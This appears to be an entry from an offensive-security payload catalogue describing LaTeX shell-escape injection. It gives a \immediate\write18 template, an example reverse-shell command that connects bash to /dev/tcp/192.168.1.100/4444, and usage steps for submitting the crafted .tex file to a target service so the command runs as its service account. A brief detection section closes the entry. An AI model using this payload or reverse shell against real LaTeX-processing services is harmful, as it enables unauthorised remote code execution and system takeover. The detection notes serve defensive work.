---
id: 2d428d6a-8f97-4f1b-8e87-0a8f70762492
type: code
language: LaTeX
verified: true
created_at: '2019-10-16T00:00:03.572087+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
  - Windows
tags:
  - RCE
  - shell-escape
  - known-vulnerability
validated: true
---

# LaTeX-Shell-Escape-Execution

## Code

```latex
\immediate\write18{$PAYLOAD}
```

## Description

This LaTeX primitive uses the `\write18` command to immediately execute an external shell command during PDF compilation, provided shell-escape is enabled. It serves as the injection point for arbitrary code execution in vulnerable LaTeX processors.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $PAYLOAD | The shell command or script to execute | `bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"` |

## Usage

Replace $PAYLOAD with a command like a reverse shell or file download. Embed in a .tex document and submit to the target service. The command runs as the user processing the PDF (often a web server or service account).

## Detection

- Static analysis of .tex files for `\write18` usage.
- Logging of shell commands invoked by pdflatex (enable verbose logging).
- Runtime monitoring for process creation from LaTeX compilers.

## Related

- [[procedures/LaTeX-PDF-Read-Write-and-Code-Execution]]
